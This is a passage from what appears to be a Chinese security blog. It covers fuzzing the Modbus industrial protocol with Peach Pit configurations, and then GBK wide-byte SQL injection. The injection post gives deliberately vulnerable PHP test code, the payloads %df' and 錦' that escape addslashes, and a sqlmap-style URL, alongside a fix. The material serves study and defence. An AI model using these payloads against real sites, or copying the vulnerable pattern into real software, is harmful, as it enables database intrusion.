<td style="text-align:center">编程（只用于484）</td>
<td style="text-align:center">使主机模拟编程器作用，修改PC从机逻辑</td>
</tr>
<tr>
<td>10</td>
<td style="text-align:center">控询（只用于484）</td>
<td style="text-align:center">可使主机与一台正在执行长程序任务从机通信，探询该从机是否已完成其操作任务，仅在含有功能码9的报文发送后，本功能码才发送</td>
</tr>
<tr>
<td>11</td>
<td style="text-align:center">读取事件计数</td>
<td style="text-align:center">可使主机发出单询问，并随即判定操作是否成功，尤其是该命令或其他应答产生通信错误时</td>
</tr>
<tr>
<td>12</td>
<td style="text-align:center">读取通信事件记录</td>
<td style="text-align:center">可是主机检索每台从机的ModBus事务处理通信事件记录。如果某项事务处理完成，记录会给出有关错误</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">编程（184/384 484 584）</td>
<td style="text-align:center">可使主机模拟编程器功能修改PC从机逻辑</td>
</tr>
<tr>
<td>14</td>
<td style="text-align:center">探询（184/384 484 584）</td>
<td style="text-align:center">可使主机与正在执行任务的从机通信，定期控询该从机是否已完成其程序操作，仅在含有功能13的报文发送后，本功能码才得发送</td>
</tr>
<tr>
<td>15</td>
<td style="text-align:center">强置多线圈</td>
<td style="text-align:center">强置一串连续逻辑线圈的通断</td>
</tr>
<tr>
<td>16</td>
<td style="text-align:center">预置多寄存器</td>
<td style="text-align:center">把具体的二进制值装入一串连续的保持寄存器</td>
</tr>
<tr>
<td>17</td>
<td style="text-align:center">报告从机标识</td>
<td style="text-align:center">可使主机判断编址从机的类型及该从机运行指示灯的状态</td>
</tr>
<tr>
<td>18</td>
<td style="text-align:center">（884和MICRO 84）</td>
<td style="text-align:center">可使主机模拟编程功能，修改PC状态逻辑</td>
</tr>
<tr>
<td>19</td>
<td style="text-align:center">重置通信链路</td>
<td style="text-align:center">发生非可修改错误后，是从机复位于已知状态，可重置顺序字节</td>
</tr>
<tr>
<td>20</td>
<td style="text-align:center">读取通用参数（584L）</td>
<td style="text-align:center">显示扩展存储器文件中的数据信息</td>
</tr>
<tr>
<td>21</td>
<td style="text-align:center">写入通用参数（584L）</td>
<td style="text-align:center">把通用参数写入扩展存储文件，或修改之</td>
</tr>
</tbody>
</table>
<h3 id="Peach简介"><a href="#Peach简介" class="headerlink" title="Peach简介"></a>Peach简介</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Michael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。</p>
<p>Peach支持对文件格式、ActiveX、网络协议、API等进行Fuzz测试；Peach Fuzz的关键是编写Peach Pit配置文件。</p>
<p>Windows下使用Peach3需要预先安装.net 4和windbg；Linux、OS X下需要安装Mono .net开发框架。</p>
<h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz1.png" alt=""></p>
<ul>
<li>-1：执行第1次测试。</li>
<li><p>-a：启动Peach代理。不指定”channel”默认为本地代理（默认支持，无需显式启动）；<br>“channel”可以指定为”tcp”远程代理。</p>
</li>
<li><p>-c：统计测试用例数。</p>
</li>
<li>-t：验证Peach Pit xml文件正确性。</li>
<li>-p：并行Fuzz。运行Peach的机器总数为M，这是第N个。</li>
<li>–debug：调试信息开关。</li>
<li>–skipto：指定Fuzz跳过的测试用例数。</li>
<li>–range：指定Fuzz的测试用例范围。</li>
</ul>
<h3 id="Peach-Pit"><a href="#Peach-Pit" class="headerlink" title="Peach Pit"></a>Peach Pit</h3><p>在使用Peach进行Fuzz之前需要编写被称为”Peach Pit”的xml配置文件，其中包含着如何进行Fuzz的关键信息，如下图：<br><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz2.png" alt=""></p>
<h3 id="peach模糊测试"><a href="#peach模糊测试" class="headerlink" title="peach模糊测试"></a>peach模糊测试</h3><p>在研究网络协议模糊测试时，sulley和peach两大框架是最常见的Fuzz框架，peach相对于sulley有以下几点优势：</p>
<ul>
<li>1、sulley目前已不再维护。</li>
<li>2、对sulley模糊测试编写程序，需要有一定的python语言基础。而peach是xml格式的，比较容易理解。</li>
<li>3、sulley配置环境相对繁琐，而peach配置环境相对简单（目前我手头有绿色版本，可以直接运行）。</li>
<li>4、sulley只能对网络协议进行模糊测试，而peach相对更加多样化。</li>
</ul>
<h2 id="Peach协议Fuzz"><a href="#Peach协议Fuzz" class="headerlink" title="Peach协议Fuzz"></a>Peach协议Fuzz</h2><h3 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz3.png" alt=""></p>
<h4 id="流程图具体工作原理"><a href="#流程图具体工作原理" class="headerlink" title="流程图具体工作原理"></a>流程图具体工作原理</h4><ul>
<li>1、根据协议控制规范或者捕获工业控制网络协议数据流来构造正常的数据包；</li>
<li>2、分析正常协议的字段及其重要性；</li>
<li>3、根据分析的协议中不同的数据类型，设计有效地变异策略。</li>
<li>4、设计并实现工业控制网络协议数据包发包工具；</li>
<li>5、设计并实现代理器及监视器；</li>
<li>6、采用发包工具，将畸形数据包发送给被测工控目标；</li>
<li>7、通过监视器探测被测工控目标异常数据记录。</li>
</ul>
<h3 id="NetWork-xml简单分析"><a href="#NetWork-xml简单分析" class="headerlink" title="NetWork.xml简单分析"></a>NetWork.xml简单分析</h3><p>在Peach的目录里有个samples目录,里面有官方给出的一些Pit，以NetWork.xml文件为例做一个简单的分析，具体如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz4.png" alt=""></p>
<h3 id="Modbus-Fuzz-Pit编写"><a href="#Modbus-Fuzz-Pit编写" class="headerlink" title="Modbus Fuzz Pit编写"></a>Modbus Fuzz Pit编写</h3><p>由于是初次接触Peach对Modbus工控协议的模糊测试，目前也对Modbus协议不是很熟悉，所以只能在网络上找个各种资料。<br>经过一番寻找，最终在github上找到了一份Pit，就是关于对modbus功能码的Fuzz Peach Pit。文章Reference处给出链接。<br>简单地阅读和分析这个Pit发现，这个Pit对01 02 03 04 05 06 15 16 20 21 22 23 24 这几个功能进行Fuzz。除了22 23 24这几个功能码没有在文章开头提到，其他都在基础知识中有。关于22 23 24三个功能码具体如下</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">作用描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td style="text-align:center">屏蔽写寄存器</td>
</tr>
<tr>
<td>23</td>
<td style="text-align:center">读/写多个寄存器</td>
</tr>
<tr>
<td>24</td>
<td style="text-align:center">读FIFO队列</td>
</tr>
</tbody>
</table>
<p>另外发现，在我们找到的Pit中，缺少了Agents-Monitors部分即监听器模块部分。Agents部分可以在本地或远程运行，可以执行附加调试器的动作，看内存消耗，检测故障等。<br>查看官方文档可以知道Peach Fuzz根据不同的环境类型支持以下几种Monitors</p>
<p>Windows Monitors</p>
<ul>
<li>Windows Debugger Monitor</li>
<li>Cleanup Registry Monitor</li>
<li>Page Heap Monitor</li>
<li>Popup Watcher Monitor</li>
<li>Windows Service Monitor</li>
</ul>
<p>OS X Monitors</p>
<ul>
<li>OS X Crash Wrangler Monitor</li>
<li>OS X Crash Reporter Monitor</li>
</ul>
<p>Linux Monitors</p>
<ul>
<li>Linux Crash Monitor</li>
</ul>
<p>Cross Platform Monitors</p>
<ul>
<li>CanaKit Relay Monitor</li>
<li>Cleanup Folder Monitor</li>
<li>IpPower9258 Monitor</li>
<li>Memory Monitor</li>
<li>Pcap Network Monitor</li>
<li>Ping Monitor</li>
<li>Process Launcher Monitor</li>
<li>Process Killer Monitor</li>
<li>Save File Monitor</li>
<li>Socket Listener Monitor</li>
<li>SSH Monitor</li>
<li>SSH Downloader Monitor</li>
<li>Vmware Control Monitor</li>
</ul>
<p>由于我们是对Modbus工控协议的模糊测试，这里我们可以用常见的Ping Monitor和Socket Listener Monitor。经过向一些之前有过Modbus Peach Fuzz研究的前辈的请教，得到结果是用Ping Monitor的误报率比较高，所以我们在编写是使用的是Socket Listener Monitor。</p>
<p>以下给出Ping Monitor和Socket Listener Monitor的编写模板</p>
<h4 id="Ping-Monitor"><a href="#Ping-Monitor" class="headerlink" title="Ping Monitor"></a>Ping Monitor</h4><p>Parameters</p>
<ul>
<li>Host — Hostname or IP address</li>
<li>Timeout — Timeout in milliseconds (optional, defaults to 1,000)</li>
<li>Data — Data to send in ping packet (optional)</li>
<li>FaultOnSuccess — Fault if ping is successful (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Ping&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Host&quot; value=&quot;www.google.com&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Socket-Monitor"><a href="#Socket-Monitor" class="headerlink" title="Socket Monitor"></a>Socket Monitor</h4><p>Parameters</p>
<ul>
<li>Host — IP address of remote host (optional, defaults to “”)</li>
<li>Interface — IP address of interface to listen on (optional, defaults to 0.0.0.0)</li>
<li>Port — Port to listen on (optional, defaults to 8080)</li>
<li>Protocol — Protocol type to listen for (optional, defaults to tcp)</li>
<li>Timeout — Length of time to wait for incoming connection (optional, defaults to 1000 ms)</li>
<li>FaultOnSuccess — Fault if no conection is recorded (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Port&quot; value=&quot;53&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>由官方文档最终得到如下Agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">       &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">			&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot; /&gt;</div><div class="line">			&lt;Param name=&quot;Port&quot; value=&quot;502&quot; /&gt;</div><div class="line">       &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>在TEST模块里引用Agent模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;Test name=&quot;Default&quot;&gt;</div><div class="line">	&lt;StateModel ref=&quot;ModbusStateModel&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Agent ref=&quot;Local&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Logger class=&quot;File&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Path&quot; value=&quot;c:\log1&quot;/&gt;</div><div class="line">	&lt;/Logger&gt;</div><div class="line">	&lt;Publisher class=&quot;tcp.Tcp&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot;/&gt;</div><div class="line">		&lt;Param name=&quot;Port&quot; value=&quot;502&quot;/&gt;</div><div class="line">	&lt;/Publisher&gt;</div><div class="line">&lt;/Test&gt;</div></pre></td></tr></table></figure></p>
<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p>先简单的说明下这个Pit的基本原理就是给工控设备发送合法的功能码，然后对数据部分进行变异。在这个过程用监听器监听，如果出现崩溃就会出现崩溃日志。这个过程是很漫长的过程，经过我跟Modbus Peach Fuzz的前辈进行的交流，得知他们的模糊测试点都是经过逆向找到的，所以Pit是不能发给我的。而我们这边目前只能对功能码进行模糊测试。据我了解对Modbus协议的模糊测试，需要先提取固件，然后对固件逆向分析，找到模糊测试的点，国内做的很少。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz5.png" alt=""></p>
<h2 id="Github-Link"><a href="#Github-Link" class="headerlink" title="Github Link"></a>Github Link</h2><p><a href="https://github.com/uknowsec/ModbusPeachPit" target="_blank" rel="external">Modbus Peach Pit</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/jseidl/peach-pit" target="_blank" rel="external">Github Peach Fuzzer PIT Files</a><br><a href="http://community.peachfuzzer.com/v3/PeachPit.html" target="_blank" rel="external">PeachPit官方文档</a><br><a href="http://blog.nsfocus.net/peach-fuzz/" target="_blank" rel="external">浅析Peach Fuzz</a><br><a href="http://www.freebuf.com/articles/security-management/88249.html" target="_blank" rel="external">工控网络协议模糊测试：用peach对modbus协议进行模糊测试</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>宽字节注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/宽字节注入漏洞的利用与学习.html</id>
    <published>2017-08-01T01:30:37.000Z</published>
    <updated>2017-08-01T04:43:01.067Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="字符、字符集与字符序"><a href="#字符、字符集与字符序" class="headerlink" title="字符、字符集与字符序"></a>字符、字符集与字符序</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
<p>字符序(collation)指同一字符集内字符间的比较规则。</p>
<h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
<h3 id="GBK编码取值范围"><a href="#GBK编码取值范围" class="headerlink" title="GBK编码取值范围"></a>GBK编码取值范围</h3><p>GBK采用双字节表示，总体编码范围为8140-FEFE，首字节在81-FE 之间，尾字节在40-FE 之间</p>
<h3 id="GB2313编码取值范围"><a href="#GB2313编码取值范围" class="headerlink" title="GB2313编码取值范围"></a>GB2313编码取值范围</h3><p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE</p>
<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
</li>
<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
</li>
</ol>
<ul>
<li>使用每个数据字段的CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<p>将操作结果从内部操作字符集转换为character_set_results。</p>
<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">\x00</div><div class="line">\n</div><div class="line">\r</div><div class="line">\</div><div class="line">&apos;</div><div class="line">&quot;</div><div class="line">\x1a</div><div class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</div></pre></td></tr></table></figure>
<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<h3 id="incov"><a href="#incov" class="headerlink" title="incov()"></a>incov()</h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>iconv — 字符串按要求的字符编码来转换</p>
<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string iconv ( string $in_charset , string $out_charset , string $str )</div></pre></td></tr></table></figure>
<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>in_charset</td>
<td style="text-align:center">输入的字符集。</td>
</tr>
<tr>
<td>out_charset</td>
<td style="text-align:center">输出的字符集。</td>
</tr>
<tr>
<td>str</td>
<td style="text-align:center">要转换的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="相关字符集设置"><a href="#相关字符集设置" class="headerlink" title="相关字符集设置"></a>相关字符集设置</h3><ul>
<li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li>
<li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li>
<li>character_set_database:数据库缺省编码字符集。</li>
<li>character_set_filesystem:文件系统编码字符集。</li>
<li>character_set_results:SQL语句执行结果编码字符集。</li>
<li>character_set_server:服务器缺省编码字符集。</li>
<li>character_set_system:系统缺省编码字符集。</li>
<li>character_sets_dir:字符集存放目录，一般不要修改</li>
</ul>
<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>　　GBK 占用两字节</p>
<p>　　ASCII占用一字节</p>
<p>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</p>
<p>　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p>
<p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p>
<h2 id="MySQL中的宽字节注入"><a href="#MySQL中的宽字节注入" class="headerlink" title="MySQL中的宽字节注入"></a>MySQL中的宽字节注入</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;uknow&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，就是根据文章的id把文章从news表中取出来。</p>
<p>在这个sql语句前面，使用了一个addslashes函数，将$id的值转义。这是通常cms中对sql注入进行的操作，只要输入参数在单引号中，就逃逸不出单引号的限制，无法注入，</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql1.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/sql2.png" alt=""></p>
<p>一般绕过addslashes的方式就是，想办法处理\’前面的\：</p>
<ul>
<li>1.想办法给\前面再加一个\（或单数个即可），变成\’，这样\被转义了，’逃出了限制</li>
<li>2.想办法把\弄没有。<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果输入%df’看会怎样：</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql3.png" alt=""><br>其中的�\是一个汉字  我们可以改成其他的。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%dd也可以：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql4.png" alt=""></p>
<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“輁”，而’逃逸了出来。</p>
<p>因为两个字节代表一个汉字，所以我们可以试试%df%df%27：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql5.png" alt=""></p>
<p>不报错了。因为%df%df是一个汉字，%5c%27不是汉字，仍然是\’。</p>
<p>我们可以利用宽字节注入的特点进行手注，也可以在url后面加上%df’丢给sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/1/0x01/index.php?id=1%df&apos;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql6.png" alt=""></p>
<h2 id="GB2312与GBK的不同"><a href="#GB2312与GBK的不同" class="headerlink" title="GB2312与GBK的不同"></a>GB2312与GBK的不同</h2><p>GB2312也是属于宽字节，那么使用GB2312连接数据库，看能否进行宽字节注入</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql7.png" alt=""></p>
<p>结果就是不能注入了：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql8.png" alt=""></p>
<p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
<h2 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h2><ul>
<li>将character_set_client设置为binary（二进制）<br>只需在所有sql语句前指定一下连接的形式是二进制：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
<p>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql10.png" alt=""></p>
<p>已经不能注入了<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql9.png" alt=""></p>
<h2 id="inconv导致的致命后果"><a href="#inconv导致的致命后果" class="headerlink" title="inconv导致的致命后果"></a>inconv导致的致命后果</h2><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;toor!@#$&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>可以看到，它在sql语句执行前，将character_set_client设置成了binary，所以可以避免宽字符注入的问题。但之后其调用了iconv将已经过滤过的参数$id给转换了一下。</p>
<p>给id参数一个值：錦’<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql11.png" alt=""></p>
<p>报错了。说明可以注入。</p>
